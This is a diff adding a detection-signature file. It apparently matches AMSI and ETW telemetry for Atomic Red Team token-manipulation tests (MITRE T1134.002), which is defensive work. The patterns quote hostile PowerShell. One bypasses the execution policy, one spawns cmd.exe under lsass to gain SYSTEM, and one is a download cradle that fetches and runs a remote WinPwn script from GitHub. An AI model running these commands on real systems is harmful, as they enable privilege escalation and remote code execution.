@@ -1,0 +1,23 @@
+T1134.002,windows,dbf4f5a9,Access Token Manipulation
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=Set-ExecutionPolicy -Scope Process Bypass -Force
+_E_,AMSI,scan_content~=$owners = @{}
+_E_,AMSI,scan_content~=gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
+_E_,AMSI,scan_content*=Get-Process | Select ProcessName.*Id.*@{l="Owner";e={$owners[$_.id.tostring()]}}
+_E_,AMSI,scan_content*=atomics.*T1134.002.*src.*GetToken.ps1;
+_E_,AMSI,scan_content~=[MyProcess]::CreateProcessFromParent((Get-Process lsass).Id
+_E_,AMSI,scan_content~="cmd.exe")
+_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
+_E_,ETW,event_msg~=Creating Scriptblock text
+_E_,ETW,event_data_list~=ScriptBlockText:Set-ExecutionPolicy -Scope Process Bypass -Force
+_E_,ETW,event_data_list~=$owners = @{}
+_E_,ETW,event_data_list~=gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
+_E_,ETW,event_data_list*=Get-Process | Select ProcessName.*Id.*@{l="Owner";e={$owners[$_.id.tostring()]}}
+_E_,ETW,event_data_list*=atomics.*T1134.002.*src.*GetToken.ps1;
+_E_,ETW,event_data_list~=[MyProcess]::CreateProcessFromParent((Get-Process lsass).Id
+_E_,ETW,event_data_list~="cmd.exe")
+
+T1134.002,windows,ccf4ac39,WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem
+
